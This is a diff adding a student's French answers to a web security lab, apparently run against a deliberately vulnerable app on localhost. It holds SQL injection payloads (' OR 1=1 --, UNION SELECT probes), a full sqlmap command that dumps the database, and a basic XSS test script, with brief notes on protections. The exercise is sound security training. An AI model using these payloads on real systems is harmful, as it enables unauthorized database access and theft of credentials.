@@ -29,3 +29,36 @@ possibilité d'exécuter des commandes OS, vol d'information, modification du se
 ## Question 4
 
 
+## Question 5
+Premier test avec ', qui renvoie une erreur sql;
+2eme test avec  ' OR 1=1 -- , qui renvoie la liste + password des user
+3eme test avec ' OR 1=1 UNION SELECT 1,1,1 -- , pas le bon nombre de colonnes
+4eme avec ' OR 1=1 UNION SELECT 1,2 -- 
+' OR 1=1 UNION SELECT CONCAT(information_schema.tables),2 --; unknown table information_schema 
+
+
+## Question 6
+
+sqlmap -u "http://localhost/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --dbms=mysql --dump --cookie="PHPSESSID=nhea6jcj46io50n8b7r4dl1135; security=low" -b --current-db --current-user
+
+Une injection SQL aveugle demande a la DB des questions vrai ou faux
+
+## Question 7
+<script>alert('js')</script>
+On passe une balise script dans l'input
+Faille: script pour récupérer des informations
+Protection: on escape les caractère, mise en place d'un WAF
+
+## Question 8
+
+<script>alert('js')</script>
+On passe une balise script dans l'input
+Dans le cas d'une XSS stocké, le script malicieux est stocké en base
+et peut donc se déclencher a tout moment;
+
+## Question 9
+
+Confidentiality, Integrityn, Availabitlity
+Principe du transport de données
+
+
